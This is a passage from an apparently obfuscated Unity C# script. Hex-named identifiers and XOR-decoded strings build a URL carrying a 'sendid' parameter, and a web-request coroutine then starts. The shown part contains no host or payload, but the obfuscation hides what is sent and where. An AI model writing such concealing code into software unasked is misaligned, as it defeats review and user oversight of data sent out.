byte[5] { 74, 30, 31, 30, 12 }, 55);
    }

    private string _0x7d385db6 = "";
    private string _0x809202a1(string _0xf732937f, string _0xbafe1285)
    {
        if (string.IsNullOrEmpty(_0xbafe1285))
            return _0xf732937f;
        if (_0xf732937f.Contains(_0x85e40e1c._0x8a9d8fd6(new byte[1] { 213 }, 234)))
            return _0xf732937f + _0x85e40e1c._0x8a9d8fd6(new byte[8] { 250, 175, 185, 178, 184, 181, 184, 225 }, 220) + UnityWebRequest.EscapeURL(_0xbafe1285);
        else
            return _0xf732937f + _0x85e40e1c._0x8a9d8fd6(new byte[8] { 91, 23, 1, 10, 0, 13, 0, 89 }, 100) + UnityWebRequest.EscapeURL(_0xbafe1285);
    }

    private void _0xfb1316d9(string _0x6c51a290)
    {
        _0x4d50c3ac();
        StartCoroutine(_0xb76278d2(_0x6c51a290));
    }
}

internal static class _0x85e40e1c
{
    internal static string _0x8a9d8fd6(byte[] data, byte key)
    {
        var buffer = new byte[data.Length];
        for (var i = 0; i < data.Length; i++)
            buffer[i] = (byte)(data[i] ^ key);
        return System.Text.Encoding.UTF8.GetString(buffer);
    }
}